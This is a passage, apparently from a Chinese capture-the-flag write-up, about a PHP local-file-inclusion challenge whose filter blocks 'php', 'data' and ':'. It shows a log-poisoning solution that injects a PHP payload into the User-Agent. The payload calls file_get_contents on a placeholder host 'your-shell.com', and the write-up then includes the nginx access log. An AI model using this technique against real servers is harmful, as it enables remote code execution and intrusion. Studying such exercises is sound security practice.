if(isset($_GET[&amp;#39;file&amp;#39;]))&amp;#123;
    $file = $_GET[&amp;#39;file&amp;#39;];
    $file = str_replace(&amp;quot;php&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;data&amp;quot;, &amp;quot;???&amp;quot;, $file);
    $file = str_replace(&amp;quot;:&amp;quot;, &amp;quot;???&amp;quot;, $file);
    include($file);
&amp;#125;else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;php&lt;/code&gt; &lt;code&gt;data&lt;/code&gt; &lt;code&gt;:&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看目录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;code&gt;&amp;lt;?= file_get_contents(&amp;quot;http://your-shell.com/1&amp;quot;); ?&amp;gt;&lt;/code&gt; 需要添加在原 &lt;code&gt;UA&lt;/code&gt; 内容空一格后面（这道题服务器端会对 &lt;code&gt;UA&lt;/code&gt; 格式进行检查，需要保留原&lt;code&gt;UA&lt;/code&gt; 内容）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=/var/log/nginx/access.log


